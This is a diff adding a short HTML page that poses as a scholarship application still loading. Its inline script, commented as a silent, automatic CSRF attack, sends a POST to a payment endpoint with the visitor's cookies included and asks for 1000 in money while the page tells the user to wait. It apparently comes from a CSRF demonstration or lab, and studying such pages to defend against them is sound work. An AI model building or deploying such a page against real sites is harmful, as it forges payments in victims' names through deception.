@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Scholarship Application In Progress</title>
+</head>
+<body>
+  <h2>Loading your scholarship application, please wait...</h2>
+
+  <!-- Realistic POST-based CSRF attack (silent and automatic) -->
+  <script>
+fetch("../server/pay.php", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  credentials: "include", //Auto-carrying cookies
+  body: "money=1000"
+});
+
+  </script>
+
+  <p>If the page does not respond for a long time, please do not close the window.</p>
+</body>
+</html>
